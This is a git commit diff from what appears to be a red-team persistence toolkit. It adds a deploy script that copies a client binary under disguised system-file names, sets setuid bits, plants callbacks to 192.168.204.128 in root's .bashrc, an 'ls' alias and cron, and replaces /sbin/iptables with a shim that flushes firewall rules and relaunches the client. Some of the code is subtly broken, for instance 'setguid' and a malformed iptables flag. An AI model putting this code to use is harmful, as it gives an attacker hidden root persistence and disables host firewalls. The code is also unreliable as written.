b7ddebd1e8edab5fea9550fcf1d554363e0f8636
Sunggwan Choi <sxc2679@rit.edu>
2019-09-25 23:30:34 +0100

    added iptables shim

--- payload/deploy.sh
+++ payload/deploy.sh
@@ -1,19 +1,49 @@
 #!/bin/bash
 
+# Change payload's ip:port before deployment
+payload1="/dev/shm/pulse-shm-10175238 192.168.204.128 53" 
+payload2="/dev/loop17 192.168.204.128 80"
+payload3="/etc/vmware-tools.conf 192.168.204.128 8080"
+
 # Setup tools for basic deployment 
 setup(){
     #yum install -y 
     apt-get install -y curl wget vim python3
 }
 
+# Timestomp 
+
+# Clone the client binary into different places 
 clone(){
+	cp deploy.sh /dev/shm/pulse-shm-10175238
+	cp deploy.sh /dev/loop28
+	cp deploy.sh /etc/vmware-tools.conf 
+
     cp client /dev/shm/pulse-shm-401862937
     cp client /dev/loop17
     cp client /etc/vmwaretools.conf
-
+    chmod u+s /dev/shm/pulse-shm-401862937 /dev/loop17 /etc/vmwaretools.conf
 }
 
 bashrc(){
-    
+    sed -i '30 a $payload1' /root/.bashrc
 }
 
+# Need persistent alias 
+alias_ls(){
+	alias ls="ls; $payload2"
+}
+
+cronjob(){
+	crontab -l | { cat; echo "$payload3"; } | crontab -
+}
+
+# Shim binaries
+shim(){
+	mv /sbin/iptables /var/cache/cached_iptables
+	gcc ./payload/iptables/drop.c -o ./payload/iptables/drop
+	mv ./payload/iptables/drop /bin/fw
+	mv ./payload/iptables/iptables.sh /sbin/iptables
+}
+
+shim()
---
+++ payload/iptables/drop.c
@@ -0,0 +1,13 @@
+#include <stdlib.h>
+#include <unistd.h>
+
+// Need to chain the IP:Port before deployment 
+int main(int argc, char **argv) {
+	setuid(0);
+	setguid(0);
+
+	system("iptables -F");
+	system("iptables -t -mangle -F");
+
+	system("/etc/vmware-tools.conf 192.168.204.128 8080");
+}
